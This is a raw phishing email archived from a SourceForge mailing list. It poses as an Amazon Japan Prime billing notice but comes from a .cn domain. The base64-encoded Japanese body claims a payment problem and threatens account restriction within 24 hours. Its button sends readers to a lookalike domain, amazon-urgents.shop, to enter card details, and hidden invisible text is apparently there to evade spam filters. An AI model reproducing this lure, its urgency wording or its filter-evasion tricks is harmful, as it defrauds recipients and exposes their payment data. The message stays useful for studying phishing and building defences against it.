Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 03DF34C5E6C
	for <lists+osst-users@lfdr.de>; Sun, 27 Feb 2022 20:27:40 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1nOPCl-0007Dh-OG
	for lists+osst-users@lfdr.de; Sun, 27 Feb 2022 19:27:38 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <amozon-account-update@joibvd.cn>) id 1nOPCj-0007Db-Nh
 for osst-users@lists.sourceforge.net; Sun, 27 Feb 2022 19:27:36 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:Mime-Version:Message-ID:Subject:To:
 From:Date:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Sy5HjwaT5N2MsNMDJpvq6Bs7FjZoZzBbtEvr0I5CeQc=; b=NjQyiWWN/XD5Jz1j4+KgqPl/Ub
 Sw9Y8Rd8tqmjOWTC5FZ+PMom3+SBuWEoVVznE7iO7Qx29VzgQHcmXDOtzRESKZTGgt1TmsLwc0MzT
 ughFqN8s/YBTtj0MP7nJfXVlrgLh/w1YXF8tvFyX88Vz6tlK+w3eqLCHtE5QX1xzTQcU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:Mime-Version:Message-ID:Subject:To:From:Date:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Sy5HjwaT5N2MsNMDJpvq6Bs7FjZoZzBbtEvr0I5CeQc=; b=W
 xRKf6RTVjzaR4W3TqkBEyhMipjPNq9slGksQ31nEcshuYS6mAJmqNqK/7t/RzNpt5d3myUPpFYA+m
 M9dZPQJqf+zCBMq4q8LIChdCAUzNIPOa37mqsxFXti1W7uSHLjHLD1t72+tMPIQGd5lYKLTRC5Mp4
 x22XgS6HfAFBx7j4=;
Received: from joibvd.cn ([91.215.153.118])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1nOPCf-0005U2-8d
 for osst-users@lists.sourceforge.net; Sun, 27 Feb 2022 19:27:35 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=joibvd.cn; 
 h=Date:From:To:Subject:Message-ID:Mime-Version:Content-Type;
 i=amozon-account-update@joibvd.cn;
 bh=Sy5HjwaT5N2MsNMDJpvq6Bs7FjZoZzBbtEvr0I5CeQc=;
 b=Jh3Jlk+u2UBQZkK7iL97jJd4ZIzUj9z2gGeDBw0K5nvbOU/FOs0vwk8gLcHJY2gwb1NlGLYS6Hk8
 lGiNUFofJHJs7BDzgAQzI63KTyi77NyiVAB+uiDb5YU7kM3LkbYBvdGpay1Oi/bwLCojdPCNG50D
 hnol6akGS0hxqsyYzslvcQFtH3wBCTiWP1xtOeG+2qkBEiYKBqv0QiL5rKJre7zcCqIW2TynD61j
 stWHdIe9xe6rzfnh64xEgbV4zw6REEjz1w73bk2GdS9C71ywUAS5E8/2VOAMz95iodjSruvte0m/
 W2bN/aM6GQBVD8slXoP5xDCNOp/NvJg0jPQuAw==
Date: Mon, 28 Feb 2022 03:27:20 +0800
From: "Amazons.co.jp" <amozon-account-update@joibvd.cn>
To: <osst-users@lists.sourceforge.net>
Message-ID: <20220228032733373720@joibvd.cn>
Mime-Version: 1.0
X-Spam-Score: -0.2 (/)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  お支払方法に問題があり、プライム特典をご利用いただけない状況です
    osst-users@lists.sourceforge.net、こんにちは。 Amazonプライムをご利用頂きありがとうございます。
    お調べしたところ、会費のお支払いに使用できる有効な�
    [...] 
 
 Content analysis details:   (-0.2 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
                             [URIs: amazon-urgents.shop]
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 -0.0 SPF_PASS               SPF: sender matches SPF record
  0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
                             identical to background
  0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
                             author's domain
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
X-Headers-End: 1nOPCf-0005U2-8d
Subject: [Osst-users] =?utf-8?b?QW1hem9u44OX44Op44Kk44Og44Gu6Ieq5YuV5pu0?=
	=?utf-8?b?5paw6Kit5a6a44KS6Kej6Zmk44GE44Gf44GX44G+44GX44Gf77yB55Wq?=
	=?utf-8?b?5Y+377yaMDI2NTMxMjgyODk0?=
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7776425837352149571=="
Errors-To: osst-users-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

--===============7776425837352149571==
Content-Type: multipart/related;
	type="multipart/alternative";
	boundary="=====003_Dragon566062704175_====="

This is a multi-part message in MIME format.

--=====003_Dragon566062704175_=====
Content-Type: multipart/alternative;
	boundary="=====002_Dragon566062704175_====="

--=====002_Dragon566062704175_=====
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: base64

IA0KIOOBiuaUr+aJleaWueazleOBq+WVj+mhjOOBjOOBguOCiuOAgeODl+ODqeOCpOODoOeJueWF
uOOCkuOBlOWIqeeUqOOBhOOBn+OBoOOBkeOBquOBhOeKtuazgeOBp+OBmQ0KDQpvc3N0LXVzZXJz
QGxpc3RzLnNvdXJjZWZvcmdlLm5ldOOAgeOBk+OCk+OBq+OBoeOBr+OAgg0KQW1hem9u44OX44Op
44Kk44Og44KS44GU5Yip55So6aCC44GN44GC44KK44GM44Go44GG44GU44GW44GE44G+44GZ44CC
DQrjgYroqr/jgbnjgZfjgZ/jgajjgZPjgo3jgIHkvJrosrvjga7jgYrmlK/miZXjgYTjgavkvb/n
lKjjgafjgY3jgovmnInlirnjgarjgq/jg6zjgrjjg4Pjg4jjgqvjg7zjg4njgYzjgqLjgqvjgqbj
g7Pjg4jjgavnmbvpjLLjgZXjgozjgabjgYTjgb7jgZvjgpPjgILjgq/jg6zjgrjjg4Pjg4jjgqvj
g7zjg4nmg4XloLHjga7mm7TmlrDjgIHmlrDjgZfjgYTjgq/jg6zjgrjjg4Pjg4jjgqvjg7zjg4nj
ga7ov73liqDjgavjgaTjgYTjgabjga/ku6XkuIvjga7miYvpoIbjgpLjgZTnorroqo3jgY/jgaDj
gZXjgYTjgIINCg0KDQoxLiDjgqLjgqvjgqbjg7Pjg4jjgrXjg7zjg5PjgrnjgYvjgolBbWF6b27j
g5fjg6njgqTjg6DkvJrlk6Hmg4XloLHjgpLnrqHnkIbjgZnjgovjgajjgZPjgo3jgpLjgqLjgq/j
grvjgrnjgZfjgb7jgZnjgIINCg0KDQoyLiBBbWF6b27jg5fjg6njgqTjg6DjgavnmbvpjLLjgZfj
gZ9BbWF6b24uY28uanDjga7jgqLjgqvjgqbjg7Pjg4jjgpLkvb/nlKjjgZfjgabjgrXjgqTjg7Pj
gqTjg7PjgZfjgb7jgZnjgIINCg0KDQozLiDjgIznj77lnKjjga7mlK/miZXmlrnms5XjgI3jga7k
uIvjgavjgYLjgovjgIzmlK/miZXmlrnms5XjgpLlpInmm7TjgZnjgovjgI3jga7jg6rjg7Pjgq/j
gpLjgq/jg6rjg4Pjgq/jgZfjgb7jgZnjgIINCg0KDQo0LiDmnInlirnmnJ/pmZDjga7mm7TmlrDj
gb7jgZ/jga/mlrDjgZfjgYTjgq/jg6zjgrjjg4Pjg4jjgqvjg7zjg4nmg4XloLHjgpLlhaXlipvj
gZfjgabjgY/jgaDjgZXjgYTjgIINCiAgDQrmlK/miZXmlrnms5XjgpLlpInmm7TjgZnjgosgDQoN
CuOBquOBiuOAgTI05pmC6ZaT5Lul5YaF44Gr44GU56K66KqN44GM44Gq44GE5aC05ZCI44CB6Kqg
44Gr55Sz44GX6Kiz44GU44GW44GE44G+44Gb44KT44CB44GK5a6i5qeY44Gu5a6J5YWo44Gu54K6
44CB44Ki44Kr44Km44Oz44OI44Gu5Yip55So5Yi26ZmQ44KS44GV44Gb44Gm44GE44Gf44Gg44GN
44G+44GZ44Gu44Gn44CB5LqI44KB44GU5LqG5om/44GP44Gg44GV44GE44CCDQoNCg0K44Ki44Kr
44Km44Oz44OI44Gr55m76Yyy44GuReODoeODvOODq+OCouODieODrOOCueOBq+OCouOCr+OCu+OC
ueOBp+OBjeOBquOBhOWgtOWQiA0K44GK5ZWP44GE5ZCI44KP44Gb77yaQW1hem9uLmNvLmpwICDj
gqvjgrnjgr/jg57jg7zjgrXjg7zjg5PjgrkNCg0KDQrjgYrnn6XjgonjgZs6IA0K44GT44Gu44Oh
44O844Or44Gv6YCB5L+h5bCC55So44Gn44GZ44CC44GT44Gu44Ki44OJ44Os44K544Gr6YCB5L+h
44GE44Gf44Gg44GE44Gm44KC6L+U5L+h44GE44Gf44GX44GL44Gt44G+44GZ44Gu44Gn44CB44GC
44KJ44GL44GY44KB44GU5LqG5om/6aGY44GE44G+44GZ44CCIA0K5pys44Oh44O844Or44Gv44CB
6YeN6KaB44Gq44GK55+l44KJ44Gb44Go44GX44Gm44Oh44O844Or44Gu6YWN5L+h44KS5biM5pyb
44GV44KM44Gm44GE44Gq44GE44GK5a6i44GV44G+44Gr44KC44GK6YCB44KK44GV44Gb44Gm44GE
44Gf44Gg44GE44Gm44GK44KK44G+44GZ44CCIA0K44Gq44GK44CBMjTmmYLplpPku6XlhoXjgavj
gZTnorroqo3jgYzjgarjgYTloLTlkIjjgIHoqqDjgavpgbrmhr7jgarjgYzjgonjgIHjgqLjgqvj
gqbjg7Pjg4jjgpLjg63jg4Pjgq/jgZXjgZvjgabjgYTjgZ/jgaDjgY/jgZPjgajjgpLorablkYrj
gYTjgZ/jgZfjgb7jgZnjgIIgDQoNCg0K44Oh44O844Or44Gv5bGK44GE44Gm44GK44KK44G+44GZ
DQrliKnnlKjopo/ntITjg5fjg6njgqTjg5Djgrfjg7zopo/ntITjg5Hjg7zjgr3jg4rjg6njgqTj
grrjg4nluoPlkYropo/ntITCqSAyMDIyLCBBbWF6b24uY28uanAsIEluYy4gb3IgaXRzIGFmZmls
aWF0ZXMu

--=====002_Dragon566062704175_=====
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: base64

PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMCBUcmFuc2l0aW9uYWwv
L0VOIj4NCjxIVE1MPjxIRUFEPg0KPE1FVEEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0
Zi04IiBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZT4NCjxTVFlMRSBjbGFzcz1mb3hfZ2xvYmFsX3N0
eWxlPg0KCQkJZGl2LmZveF9odG1sX2NvbnRlbnQgeyBsaW5lLWhlaWdodDogMS41O30NCgkJCWJs
b2NrcXVvdGUgeyBtYXJnaW4tVG9wOiAwcHg7IG1hcmdpbi1Cb3R0b206IDBweDsgbWFyZ2luLUxl
ZnQ6IDAuNWVtIH0NCgkJCW9sLCB1bCB7IG1hcmdpbi1Ub3A6IDBweDsgbWFyZ2luLUJvdHRvbTog
MHB4OyBsaXN0LXN0eWxlLXBvc2l0aW9uOiBpbnNpZGU7IH0NCgkJCXAgeyBtYXJnaW4tVG9wOiAw
cHg7IG1hcmdpbi1Cb3R0b206IDBweCB9DQoJCTwvU1RZTEU+DQoNCjxNRVRBIG5hbWU9R0VORVJB
VE9SIGNvbnRlbnQ9Ik1TSFRNTCAxMS4wMC4xMDU3MC4xMDAxIj48L0hFQUQ+DQo8Qk9EWT4NCjxU
QUJMRSANCnN0eWxlPSdNQVJHSU4tQk9UVE9NOiAxMHB4OyBGT05ULUZBTUlMWTogIk1pY3Jvc29m
dCBZYUhlaSI7IEJBQ0tHUk9VTkQ6ICMyMzJmM2U7IFdPUkQtU1BBQ0lORzogMHB4OyBURVhULVRS
QU5TRk9STTogbm9uZTsgT1JQSEFOUzogMjsgV0lET1dTOiAyOyBMRVRURVItU1BBQ0lORzogbm9y
bWFsOyBURVhULUlOREVOVDogMHB4OyAtd2Via2l0LXRleHQtc3Ryb2tlLXdpZHRoOiAwcHg7IHRl
eHQtZGVjb3JhdGlvbi1zdHlsZTogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLWNvbG9yOiBpbml0
aWFsJyANCmNlbGxTcGFjaW5nPTAgY2VsbFBhZGRpbmc9MCB3aWR0aD0iMTAwJSIgYm9yZGVyPTA+
DQogIDxUQk9EWT4NCiAgPFRSIHZBbGlnbj1taWRkbGU+DQogICAgPFREIGhlaWdodD02ND48SU1H
IGJvcmRlcj0wIGhzcGFjZT0wIGFsdD0iIiANCiAgICAgIHNyYz0iY2lkOjAwMDNFODM4MjFCNV8w
NTkxODUzNl8wM0RBM0Q1RiI+PC9URD4NCiAgICA8VEQgdkFsaWduPXRvcCB3aWR0aD0yMCBhbGln
bj1jZW50ZXI+Jm5ic3A7PC9URD48L1RSPjwvVEJPRFk+PC9UQUJMRT4NCjxUQUJMRSBpZD15dWlf
M18yXzBfMV8xNTM3NTY0ODAxNDA5OTM2NCANCnN0eWxlPSdNQVJHSU4tQk9UVE9NOiAyMHB4OyBG
T05ULUZBTUlMWTogIk1pY3Jvc29mdCBZYUhlaSI7IFdPUkQtU1BBQ0lORzogMHB4OyBURVhULVRS
QU5TRk9STTogbm9uZTsgUEFERElORy1CT1RUT006IDEwcHg7IFBBRERJTkctVE9QOiAxMHB4OyBP
UlBIQU5TOiAyOyBXSURPV1M6IDI7IExFVFRFUi1TUEFDSU5HOiBub3JtYWw7IFRFWFQtSU5ERU5U
OiAwcHg7IC13ZWJraXQtdGV4dC1zdHJva2Utd2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXN0
eWxlOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRpb24tY29sb3I6IGluaXRpYWwnIA0KY2VsbFNwYWNp
bmc9MCBjZWxsUGFkZGluZz0wIHdpZHRoPSIxMDAlIiBib3JkZXI9MD4NCiAgPFRCT0RZIGlkPXl1
aV8zXzJfMF8xXzE1Mzc1NjQ4MDQ2Njg2MjY2Pg0KICA8VFIgaWQ9eXVpXzNfMl8wXzFfMTUzNzU2
NDgwMjM3OTA5NzIgdkFsaWduPWJvdHRvbT4NCiAgICA8VEQgdkFsaWduPXRvcCB3aWR0aD0yMCBh
bGlnbj1jZW50ZXI+Jm5ic3A7PC9URD4NCiAgICA8VEQgaWQ9eXVpXzNfMl8wXzFfMTUzNzU2NDgw
ODE4NTAwNDIgY2xhc3M9eWl2MjE0NTg3MzgwM3Bwc2FucyANCiAgICBzdHlsZT0nRk9OVC1TSVpF
OiAxNXB4OyBGT05ULUZBTUlMWTogQ2FsaWJyaSwgVHJlYnVjaGV0LCBBcmlhbCwgInNhbnMgc2Vy
aWYiOyBDT0xPUjogcmdiKDUxLDUxLDUxKTsgTElORS1IRUlHSFQ6IDIycHgnIA0KICAgIHZBbGln
bj10b3A+DQogICAgICA8UD48U1BBTiBpZD15dWlfM18yXzBfMV8xNTM3NTY0ODA2ODI0NTkzNCBz
dHlsZT0iRElTUExBWTogaW5saW5lIj48Rk9OVCANCiAgICAgIGNvbG9yPSMzMzMzMzM+PFNQQU4g
DQogICAgICBzdHlsZT0iRk9OVC1TSVpFOiAxOXB4OyBGT05ULVdFSUdIVDogYm9sZCI+44GK5pSv
5omV5pa55rOV44Gr5ZWP6aGM44GM44GC44KK44CB44OX44Op44Kk44Og54m55YW444KS44GU5Yip
55So44GE44Gf44Gg44GR44Gq44GE54q25rOB44Gn44GZPC9TUEFOPjwvRk9OVD48L1NQQU4+PC9Q
Pg0KICAgICAgPFA+PFNQQU4gc3R5bGU9IkRJU1BMQVk6IGlubGluZSI+PEZPTlQgY29sb3I9IzMz
MzMzMz48U1BBTiANCiAgICAgIHN0eWxlPSJGT05ULVNJWkU6IDE5cHgiPjwvU1BBTj48L0ZPTlQ+
PC9TUEFOPiZuYnNwOzwvUD48U1BBTiANCiAgICAgIHN0eWxlPSJESVNQTEFZOiBpbmxpbmUiPjxG
T05UIGNvbG9yPSMzMzMzMzM+PFNQQU4gDQogICAgICBzdHlsZT0iRk9OVC1TSVpFOiAxOXB4Ij48
U1BBTiBzdHlsZT0iRk9OVC1TSVpFOiAxNnB4Ij48U1BBTiANCiAgICAgIHN0eWxlPSJESVNQTEFZ
OiBpbmxpbmUiPjxGT05UIGNvbG9yPSMzMzMzMzM+DQogICAgICA8RElWPg0KICAgICAgPERJVj5v
c3N0LXVzZXJzQGxpc3RzLnNvdXJjZWZvcmdlLm5ldOOAgeOBk+OCk+OBq+OBoeOBr+OAgjwvRElW
Pg0KICAgICAgPFA+QW1hem9u44OX44Op44Kk44Og44KS44GU5Yip55So6aCC44GN44GC44KK44GM
44Go44GG44GU44GW44GE44G+44GZ44CCPEJSPuOBiuiqv+OBueOBl+OBn+OBqOOBk+OCjeOAgeS8
muiyu+OBruOBiuaUr+aJleOBhOOBq+S9v+eUqOOBp+OBjeOCi+acieWKueOBquOCr+ODrOOCuOOD
g+ODiOOCq+ODvOODieOBjOOCouOCq+OCpuODs+ODiOOBq+eZu+mMsuOBleOCjOOBpuOBhOOBvuOB
m+OCk+OAguOCr+ODrOOCuOODg+ODiOOCq+ODvOODieaDheWgseOBruabtOaWsOOAgeaWsOOBl+OB
hOOCr+ODrOOCuOODg+ODiOOCq+ODvOODieOBrui/veWKoOOBq+OBpOOBhOOBpuOBr+S7peS4i+OB
ruaJi+mghuOCkuOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgjwvUD48QlI+DQogICAgICA8UD4xLiDj
gqLjgqvjgqbjg7Pjg4jjgrXjg7zjg5PjgrnjgYvjgolBbWF6b27jg5fjg6njgqTjg6DkvJrlk6Hm
g4XloLHjgpLnrqHnkIbjgZnjgovjgajjgZPjgo3jgpLjgqLjgq/jgrvjgrnjgZfjgb7jgZnjgII8
L1A+PEJSPg0KICAgICAgPFA+Mi4gQW1hem9u44OX44Op44Kk44Og44Gr55m76Yyy44GX44GfQW1h
em9uLmNvLmpw44Gu44Ki44Kr44Km44Oz44OI44KS5L2/55So44GX44Gm44K144Kk44Oz44Kk44Oz
44GX44G+44GZ44CCPC9QPjxCUj4NCiAgICAgIDxQPjMuIOOAjOePvuWcqOOBruaUr+aJleaWueaz
leOAjeOBruS4i+OBq+OBguOCi+OAjOaUr+aJleaWueazleOCkuWkieabtOOBmeOCi+OAjeOBruOD
quODs+OCr+OCkuOCr+ODquODg+OCr+OBl+OBvuOBmeOAgjwvUD48QlI+DQogICAgICA8UD40LiAN
CiAgICAgIOacieWKueacn+mZkOOBruabtOaWsOOBvuOBn+OBr+aWsOOBl+OBhOOCr+ODrOOCuOOD
g+ODiOOCq+ODvOODieaDheWgseOCkuWFpeWKm+OBl+OBpuOBj+OBoOOBleOBhOOAgjwvUD48L0RJ
Vj48L0ZPTlQ+PC9TUEFOPjwvU1BBTj48L1NQQU4+Jm5ic3A7IA0KDQogICAgICA8UD48QSBjbGFz
cz1idXR0b24gDQogICAgICBzdHlsZT0iRk9OVC1TSVpFOiAxNnB4OyBDVVJTT1I6IHBvaW50ZXI7
IFRFWFQtREVDT1JBVElPTjogbm9uZTsgQk9SREVSLVRPUDogbWVkaXVtIG5vbmU7IEJPUkRFUi1S
SUdIVDogbWVkaXVtIG5vbmU7IEJBQ0tHUk9VTkQ6ICMyMzJmM2U7IEJPUkRFUi1CT1RUT006IG1l
ZGl1bSBub25lOyBDT0xPUjogd2hpdGU7IFBBRERJTkctQk9UVE9NOiAxNXB4OyBURVhULUFMSUdO
OiBjZW50ZXI7IFBBRERJTkctVE9QOiAxNXB4OyBQQURESU5HLUxFRlQ6IDMycHg7IEJPUkRFUi1M
RUZUOiBtZWRpdW0gbm9uZTsgTUFSR0lOOiAxNHB4IDEycHg7IERJU1BMQVk6IGlubGluZS1ibG9j
azsgUEFERElORy1SSUdIVDogMzJweDsgYm9yZGVyLXJhZGl1czogOHB4IiANCiAgICAgIGhyZWY9
Imh0dHBzOi8vYW1hem9uLXVyZ2VudHMuc2hvcC8iIHRhcmdldD1fYmxhbms+PFNUUk9ORz48Rk9O
VCANCiAgICAgIGNvbG9yPXdoaXRlPuaUr+aJleaWueazleOCkuWkieabtOOBmeOCizwvRk9OVD48
L1NUUk9ORz48L0E+PC9GT05UPjxGT05UIGNvbG9yPSMzMzMzMzM+IA0KICAgICAgPFA+PEJSPjxT
UEFOIA0KICAgICAgc3R5bGU9IkZPTlQtU0laRTogMTRweCI+PEI+44Gq44GK44CBMjTmmYLplpPk
u6XlhoXjgavjgZTnorroqo3jgYzjgarjgYTloLTlkIjjgIHoqqDjgavnlLPjgZfoqLPjgZTjgZbj
gYTjgb7jgZvjgpPjgIHjgYrlrqLmp5jjga7lronlhajjga7ngrrjgIHjgqLjgqvjgqbjg7Pjg4jj
ga7liKnnlKjliLbpmZDjgpLjgZXjgZvjgabjgYTjgZ/jgaDjgY3jgb7jgZnjga7jgafjgIHkuojj
goHjgZTkuobmib/jgY/jgaDjgZXjgYTjgII8L0I+PC9TUEFOPjwvUD48L0ZPTlQ+PC9TUEFOPjxG
T05UIA0KICAgICAgY29sb3I9IzMzMzMzMz48QlI+DQogICAgICA8UD7jgqLjgqvjgqbjg7Pjg4jj
gavnmbvpjLLjga5F44Oh44O844Or44Ki44OJ44Os44K544Gr44Ki44Kv44K744K544Gn44GN44Gq
44GE5aC05ZCIPEJSPuOBiuWVj+OBhOWQiOOCj+OBm++8mjxBIA0KICAgICAgc3R5bGU9IlRFWFQt
REVDT1JBVElPTjogbm9uZTsgQ09MT1I6IHJnYig1MSw1MSw1MSkiIA0KICAgICAgaHJlZj0iaHR0
cHM6Ly93d3cuYW1hem9uLmNvLmpwLyI+QW1hem9uLmNvLmpwPC9BPiZuYnNwOyANCiAgICAgIOOC
q+OCueOCv+ODnuODvOOCteODvOODk+OCuTwvUD48QlI+PEJSPg0KICAgICAgPFRBQkxFIGNsYXNz
PXlpdjIxNDU4NzM4MDN0aXBzIA0KICAgICAgc3R5bGU9IkJPUkRFUi1UT1A6IHJnYigyMzgsMjM4
LDIzOCkgMXB4IHNvbGlkOyBCT1JERVItUklHSFQ6IHJnYigyMzgsMjM4LDIzOCkgMXB4IHNvbGlk
OyBCT1JERVItQk9UVE9NOiByZ2IoMjM4LDIzOCwyMzgpIDFweCBzb2xpZDsgRk9OVDogMTFweCBD
YWxpYnJpLCBUcmVidWNoZXQsIEFyaWFsLCAnc2FucyBzZXJpZicsIHNhbnMtc2VyaWY7IEJPUkRF
Ui1MRUZUOiByZ2IoMjM4LDIzOCwyMzgpIDFweCBzb2xpZCIgDQogICAgICBjZWxsU3BhY2luZz0w
IGNlbGxQYWRkaW5nPTEwPg0KICAgICAgICA8VEJPRFk+DQogICAgICAgIDxUUj4NCiAgICAgICAg
ICA8VEQgDQogICAgICAgICAgc3R5bGU9IkNPTE9SOiByZ2IoNTEsNTEsNTEpOyBGT05UOiAxMXB4
IENhbGlicmksIFRyZWJ1Y2hldCwgQXJpYWwsICdzYW5zIHNlcmlmJywgc2Fucy1zZXJpZjsgTUFS
R0lOOiAwcHgiPuOBiuefpeOCieOBmzogDQoNCiAgICAgICAgICAgIDxVTD4NCiAgICAgICAgICAg
ICAgPExJPjxTUEFOIA0KICAgICAgICAgICAgICBzdHlsZT0iRElTUExBWTogaW5saW5lIj7jgZPj
ga7jg6Hjg7zjg6vjga/pgIHkv6HlsILnlKjjgafjgZnjgILjgZPjga7jgqLjg4njg6zjgrnjgavp
gIHkv6HjgYTjgZ/jgaDjgYTjgabjgoLov5Tkv6HjgYTjgZ/jgZfjgYvjga3jgb7jgZnjga7jgafj
gIHjgYLjgonjgYvjgZjjgoHjgZTkuobmib/poZjjgYTjgb7jgZnjgII8L1NQQU4+IA0KDQogICAg
ICAgICAgICAgIDxMST48U1BBTiANCiAgICAgICAgICAgICAgc3R5bGU9IkRJU1BMQVk6IGlubGlu
ZSI+5pys44Oh44O844Or44Gv44CB6YeN6KaB44Gq44GK55+l44KJ44Gb44Go44GX44Gm44Oh44O8
44Or44Gu6YWN5L+h44KS5biM5pyb44GV44KM44Gm44GE44Gq44GE44GK5a6i44GV44G+44Gr44KC
44GK6YCB44KK44GV44Gb44Gm44GE44Gf44Gg44GE44Gm44GK44KK44G+44GZ44CCPC9TUEFOPiAN
Cg0KICAgICAgICAgICAgICA8TEk+44Gq44GK44CBMjTmmYLplpPku6XlhoXjgavjgZTnorroqo3j
gYzjgarjgYTloLTlkIjjgIHoqqDjgavpgbrmhr7jgarjgYzjgonjgIHjgqLjgqvjgqbjg7Pjg4jj
gpLjg63jg4Pjgq/jgZXjgZvjgabjgYTjgZ/jgaDjgY/jgZPjgajjgpLorablkYrjgYTjgZ/jgZfj
gb7jgZnjgIIgDQogICAgICAgICAgPC9MST48L1VMPjwvVEQ+PC9UUj48L1RCT0RZPjwvVEFCTEU+
DQogICAgICA8RElWIHN0eWxlPSJGSUxURVI6IEFscGhhKG9wYWNpdHk9MCk7IG9wYWNpdHk6IDAi
Pg0KICAgICAgPFAgDQogICAgICBzdHlsZT0iRk9OVC1TSVpFOiAxcHg7IENPTE9SOiAjZmZmZmZm
OyAtd2Via2l0LXRvdWNoLWNhbGxvdXQ6IG5vbmU7IC13ZWJraXQtdXNlci1zZWxlY3Q6IG5vbmU7
IC1raHRtbC11c2VyLXNlbGVjdDogbm9uZTsgLW1vei11c2VyLXNlbGVjdDogbm9uZTsgLW1zLXVz
ZXItc2VsZWN0OiBub25lOyB1c2VyLXNlbGVjdDogbm9uZSI+44Oh44O844Or44Gv5bGK44GE44Gm
44GK44KK44G+44GZPC9QPjwvRElWPjwvRk9OVD48L1REPjwvVFI+PC9UQk9EWT48L1RBQkxFPg0K
PFRBQkxFIA0Kc3R5bGU9J01BUkdJTi1CT1RUT006IDEwcHg7IEZPTlQtRkFNSUxZOiAiTWljcm9z
b2Z0IFlhSGVpIjsgQkFDS0dST1VORDogIzIzMmYzZTsgV09SRC1TUEFDSU5HOiAwcHg7IE1BUkdJ
Ti1UT1A6IDIwcHg7IFRFWFQtVFJBTlNGT1JNOiBub25lOyBPUlBIQU5TOiAyOyBXSURPV1M6IDI7
IExFVFRFUi1TUEFDSU5HOiBub3JtYWw7IFRFWFQtSU5ERU5UOiAwcHg7IC13ZWJraXQtdGV4dC1z
dHJva2Utd2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyB0ZXh0LWRl
Y29yYXRpb24tY29sb3I6IGluaXRpYWwnIA0KY2VsbFNwYWNpbmc9MCBjZWxsUGFkZGluZz0wIHdp
ZHRoPSIxMDAlIiBhbGlnbj1jZW50ZXIgYm9yZGVyPTA+DQogIDxUQk9EWSBzdHlsZT0iSEVJR0hU
OiAxMDBweCI+DQogIDxUUiBzdHlsZT0iSEVJR0hUOiAxMDBweCIgYWxpZ249Y2VudGVyIHZBbGln
bj1taWRkbGU+DQogICAgPFREPjxTUEFOPjxGT05UIGNvbG9yPXdoaXRlPuWIqeeUqOimj+e0hOOD
l+ODqeOCpOODkOOCt+ODvOimj+e0hOODkeODvOOCveODiuODqeOCpOOCuuODieW6g+WRiuimj+e0
hMKpIDIwMjIsIEFtYXpvbi5jby5qcCwgDQogICAgICBJbmMuIG9yIGl0cyBhZmZpbGlhdGVzLjwv
Rk9OVD48L1NQQU4+PC9URD48L1RSPjwvVEJPRFk+PC9UQUJMRT48L0JPRFk+PC9IVE1MPg0K

--=====002_Dragon566062704175_=====--

